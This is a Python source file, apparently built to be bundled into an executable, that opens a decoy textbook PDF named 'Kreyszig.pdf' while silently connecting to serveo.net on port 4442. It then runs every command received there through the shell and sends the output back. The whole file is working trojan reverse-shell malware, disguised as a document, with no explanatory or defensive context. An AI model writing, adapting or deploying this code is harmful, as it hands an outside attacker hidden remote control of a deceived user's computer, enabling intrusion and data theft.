import socket, subprocess, os, sys, tkinter
file_name = sys._MEIPASS + "\Kreyszig.pdf"
subprocess.Popen(file_name, shell=True)
def cd1(path):
    os.chdir(path)
    msg = os.getcwd()
    return msg
def execute(command):
    DEVNULL = open(os.devnull, 'wb')
    return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)
connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    connection.connect(("serveo.net", 4442))
except socket.error:
    pass
else:
    rcvd = "[+] connection established"
    while rcvd != "quit":
        rcvd = (connection.recv(1024)).decode()
        if rcvd != "quit":
            try:
                check=rcvd.split(" ")
                if check[0] == "cd":
                    # res=(check[1]).encode()
                    DEVNULL = open(os.devnull, 'wb')
                    n=os.chdir(check[1],stderr=DEVNULL, stdin=DEVNULL)
                    res = (os.getcwd()).encode()
                    # res=check[1].encode()
                else:
                    res = execute(rcvd)
            except:
                pass
            else:
                connection.send(res)                            
    connection.close()
    sys.exit(0)
